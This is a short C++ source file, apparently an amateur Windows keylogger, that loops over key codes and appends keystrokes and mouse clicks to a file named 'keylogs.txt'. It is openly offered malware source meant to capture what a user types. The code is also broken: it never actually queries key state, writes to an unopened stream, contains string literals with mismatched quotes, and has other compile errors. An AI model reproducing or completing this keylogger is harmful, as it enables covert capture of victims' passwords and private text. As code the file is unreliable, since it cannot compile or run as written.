//imports
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

//creating a instance to save the logged keys in a text file
void WriteToLog(LPCSTR text){
    ofstream logfile; //creates object for file stream
    logfile << text; //writes text string to file
    logfile.close(); //closed log file
}
bool KeyIsListed(int iKey){
    switch (iKey)
    {
        case VK_SPACE:
            cout << ""; //emulates space
            WriteToLog(" ");
            break;
        case VK_RETURN:
            cout << "\n"; //emulates return
            WriteToLog(" \n ");
            break;
        case VK_SHIFT:
            cout << " "Shift""; //emulates shift
            WriteToLog(" "Shift" ");
            break;
        case VK_BACK:
            cout << "\b"; //emulates backspace
            WriteToLog("\b");
            break;
        case VK_RBUTTON:
            cout << " "rclick" "; //emulates right click of the mouse
            WriteToLog(" "rclick" ");
            break;
        case VK_LBUTTON:
            cout << " "lclick" "; //emulates lift click of the mouse
            WriteToLog(" "lclick" ");
            break;
        default: return false; //it will determine if key exists

    }
}
int main()
{
    char key;
    while(TRUE)
    {

        sleep(10);
        for (key = 8; key <= 190; key++){
            if(KeyIsListed(key) == FALSE){
                cout << key;
                ofstream logfile;
                logfile.open("keylogs.txt", fstream::app);
                logfile << key; //write the key strikes in a file
                logfile.close() //closes the log
            }
        }
    }
}
